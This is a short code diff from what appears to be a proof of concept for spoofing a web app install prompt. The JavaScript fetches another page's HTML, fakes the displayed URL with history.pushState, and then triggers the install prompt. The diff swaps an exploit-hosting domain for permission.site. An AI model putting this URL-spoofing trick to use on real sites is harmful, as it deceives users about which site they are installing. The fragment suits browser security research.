@@ -30,7 +30,7 @@
             if (deferredPrompt) {
                 // Step 1: Fetch the new page content
                 try {
-                    const response = await fetch('https://0x1337-exploit.github.io/hosting/pwa/newpage.html'); // Replace with your target URL
+                    const response = await fetch('https://permission.site'); // Replace with your target URL
                     if (!response.ok) throw new Error('Failed to fetch new page');
                     const html = await response.text();
 
@@ -55,7 +55,7 @@
                     });
 
                     // Step 5: Simulate URL change without reload
-                    history.pushState({}, '', 'https://0x1337-exploit.github.io/hosting/pwa/newpage.html'); // Matches the fetched URL
+                    history.pushState({}, '', 'https://permission.site'); // Matches the fetched URL
 
                     // Now the "redirect" is done, delay and show prompt
                     setTimeout(() => {
